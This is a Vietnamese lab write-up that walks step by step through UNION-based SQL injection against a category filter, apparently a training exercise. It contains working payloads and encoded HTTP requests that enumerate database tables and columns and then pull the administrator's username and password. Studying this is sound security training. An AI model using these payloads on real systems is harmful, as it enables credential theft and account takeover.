# SQL Injection Lab 09: Retrieving Data from Other Tables with UNION

## Mục tiêu
Dùng `UNION SELECT` để lấy `username`, `password` từ bảng `users`, sau đó đăng nhập tài khoản `administrator`.

## Đề bài
<img src="images/09_union-other-tables-2026-04-14-22-53-48.png" alt="Lab overview" width="760" />
<br><br>

## Bước 1: Xác định số cột của truy vấn

```sql
' union select null, null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20null%2C%20null%20-- HTTP/2
```

<img src="images/09_union-other-tables-2026-04-14-22-56-07.png" alt="Xác định số cột" width="760" />
<br><br>

## Bước 2: Xác định cột hiển thị text

```sql
' union select 'abc', null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20%27abc%27%2C%20null%20-- HTTP/2
```

<img src="images/09_union-other-tables-2026-04-14-22-56-45.png" alt="Xác định cột text" width="760" />
<br><br>

## Bước 3: Liệt kê bảng trong database

```sql
' union select table_name, null from information_schema.tables --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20table_name%2C%20null%20from%20information_schema.tables%20-- HTTP/2
```

<img src="images/09_union-other-tables-2026-04-14-22-58-02.png" alt="Liệt kê bảng" width="760" />
<br><br>

## Bước 4: Liệt kê cột để tìm username/password

```sql
' union select column_name, null from information_schema.columns --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20column_name%2C%20null%20from%20information_schema.columns%20-- HTTP/2
```

<img src="images/09_union-other-tables-2026-04-14-23-00-53.png" alt="Liệt kê cột" width="760" />
<br><br>

## Bước 5: Lấy thông tin administrator

```sql
' union select username, password from users where username = 'administrator' --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20username%2C%20password%20from%20users%20where%20username%20%3D%20%27administrator%27%20-- HTTP/2
```

<img src="images/09_union-other-tables-2026-04-14-23-02-53.png" alt="Thông tin administrator" width="760" />
<br><br>

## Payload solve

```sql
' union select username, password from users where username = 'administrator' --
```

## Kết quả
Lấy được tài khoản `administrator` và đăng nhập thành công.
